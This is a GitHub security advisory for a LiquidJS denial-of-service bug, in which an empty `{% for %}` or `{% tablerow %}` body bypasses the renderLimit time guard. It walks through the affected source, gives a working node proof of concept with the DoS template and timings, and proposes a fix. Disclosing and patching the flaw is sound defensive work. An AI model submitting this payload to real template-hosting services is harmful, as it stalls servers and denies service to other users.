# [M] LiquidJS has a renderLimit DoS guard bypass via empty `{% for %}` body

## Summary
Severity: Medium
Advisory: GHSA-8xx9-69p8-7jp3
CVE: CVE-2026-44645
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-8xx9-69p8-7jp3
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0

## Details
## Summary

The `renderLimit` option — documented in `docs/source/tutorials/dos.md` as the mechanism that "mitigates this by limiting the time consumed by each render() call" — can be fully bypassed by a `{% for %}` (or `{% tablerow %}`) tag whose body is empty. The per-iteration time check is reached only when the body contains at least one template node, so a template like `{%- for i in (1..N) -%}{%- endfor -%}` iterates the full collection without ever consulting `renderLimit`. With a configured `renderLimit` of 50 ms, a single `parseAndRenderSync` call has been observed to consume **2.26 seconds** (~45× over the limit) and scales linearly with `N` up to `memoryLimit`, allowing a low-privileged template author to wedge an event-loop thread for an attacker-chosen duration.

## Details

`Render.renderTemplates` is the single point at which `renderLimit` is consulted:

```ts
// src/render/render.ts
14:  public * renderTemplates (templates: Template[], ctx: Context, emitter?: Emitter): IterableIterator<any> {
15:    if (!emitter) {
16:      emitter = ctx.opts.keepOutputType ? new KeepingTypeEmitter() : new SimpleEmitter()
17:    }
18:    const errors = []
19:    for (const tpl of templates) {
20:      ctx.renderLimit.check(getPerformance().now())
21:      try {
22:        const html = yield tpl.render(ctx, emitter)
...
32:    }
```

The check at line 20 lives **inside** the `for (const tpl of templates)` body. When `templates.length === 0`, the loop body never executes, so the limiter is never consulted on that invocation.

The `for` tag re-enters `renderTemplates` once per collection item with no independent time check:

```ts
// src/tags/for.ts
70:    for (const item of collection) {
71:      scope[this.variable] = item
72:      ctx.continueCalled = ctx.breakCalled = false
73:      yield r.renderTemplates(this.templates, ctx, emitter)
74:      if (ctx.breakCalled) break
75:      scope.forloop.next()
76:    }
```

When `{%- for i in (1..N) -%}{%- endfor -%}` is parsed, `this.templates` is `[]`. Each of the `N` calls to `r.renderTemplates(this.templates, ctx, emitter)` therefore performs zero `renderLimit.check()` calls and zero template work — it just spins the JS-level `for` loop and the generator boilerplate. With `N = 30_000_000` this still costs ~2.26 s of CPU, and `N = 100_000_000` costs ~9.6 s, fully bypassing whatever wall-clock budget the integrator configured.

The range expression itself is bounded only by `memoryLimit`:

```ts
// src/render/expression.ts:67-72
function * evalRangeToken (token: RangeToken, ctx: Context) {
  const low: number = yield evalToken(token.lhs, ctx)
  const high: number = yield evalToken(token.rhs, ctx)
  ctx.memoryLimit.use(high - low + 1)
  return range(+low, +high + 1)
}
```

So the maximum bypass is governed by the (separate) `memoryLimit`, not by `renderLimit`. Integrators following the `docs/source/tutorials/dos.md` guidance — which positions `renderLimit` as the time-based defense — get no time-based defense at all on this code path.

## PoC

Reproduced against `liquidjs@10.25.7` (HEAD `34877950`):

```bash
# Empty for-body bypasses renderLimit (50 ms) and runs for ~2.26 s:
$ node -e "const { Liquid } = require('liquidjs');
  const engine = new Liquid({ memoryLimit: 1e9, renderLimit: 50 });
  const t = Date.now();
  engine.parseAndRenderSync('{%- for i in (1..30000000) -%}{%- endfor -%}', {});
  console.log('Took', Date.now()-t, 'ms');"
Took 2255 ms

# Same template with a single-character body is correctly bounded:
$ node -e "const { Liquid } = require('liquidjs');
  const engine = new Liquid({ memoryLimit: 1e9, renderLimit: 50 });
  try { engine.parseAndRenderSync('{%- for i in (1..30000000) -%}.{%- endfor -%}', {}); }
  catch(e) { console.log('correctly threw:', e.message); }"
correctly threw: template render limit exceeded, line:1, col:1
```

Scaling `N`:
- `N = 30_000_000` → 2255 ms (≈ 45× over the 50 ms limit)
- `N = 100_000_000` → 9581 ms (≈ 191× over the 50 ms limit)

Time grows linearly with `N`, capped only by `memoryLimit` (default `Infinity`, so the only cap by default is process memory).

## Impact

Any liquidjs integrator who follows the upstream DoS guidance and sets a finite `renderLimit` to bound per-render CPU — typical for SaaS / multi-tenant environments where end users author templates (themes, email templates, snippets) — does not get the bound they configured. A single template submission can keep an event-loop thread busy for seconds, which on a Node.js server is sufficient to stall all in-flight requests on that worker. With a large enough range and a permissive `memoryLimit`, the wedge time is attacker-controlled. No data is exposed and no integrity is harmed; impact is availability only.

## Recommended Fix

Move the `renderLimit` check to a location that runs unconditionally per `renderTemplates` invocation, so a zero-template body still triggers it; alternatively (or additionally) have iteration tags that invoke `renderTemplates` per element check the limiter themselves once per iteration.

```ts
// src/render/render.ts — check at function entry, before the templates loop
public * renderTemplates (templates: Template[], ctx: Context, emitter?: Emitter): IterableIterator<any> {
  if (!emitter) {
    emitter = ctx.opts.keepOutputType ? new KeepingTypeEmitter() : new SimpleEmitter()
  }
  ctx.renderLimit.check(getPerformance().now())   // <-- runs even when templates is empty
  const errors = []
  for (const tpl of templates) {
    ctx.renderLimit.check(getPerformance().now())
    ...
  }
  ...
}
```

And/or, defensively, in the iteration tags themselves so the guard cost is paid once per element rather than only at re-entry:

```ts
// src/tags/for.ts (around line 70)
for (const item of collection) {
  ctx.renderLimit.check(getPerformance().now())   // <-- per-iteration time check
  scope[this.variable] = item
  ctx.continueCalled = ctx.breakCalled = false
  yield r.renderTemplates(this.templates, ctx, emitter)
  if (ctx.breakCalled) break
  scope.forloop.next()
}

// src/tags/tablerow.ts (around line 54) — analogous addition
for (let idx = 0; idx < collection.length; idx++, tablerowloop.next()) {
  ctx.renderLimit.check(getPerformance().now())
  ...
}
```

The same hardening should be applied anywhere a tag drives an attacker-influenced loop count over a (potentially empty) `templates` array.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-8xx9-69p8-7jp3
- https://nvd.nist.gov/vuln/detail/CVE-2026-44645
- https://github.com/harttle/liquidjs/commit/5b9c3469085e01c79e2d0af28e2a13f730e1793d
- https://github.com/harttle/liquidjs
- https://github.com/harttle/liquidjs/releases/tag/v10.26.0
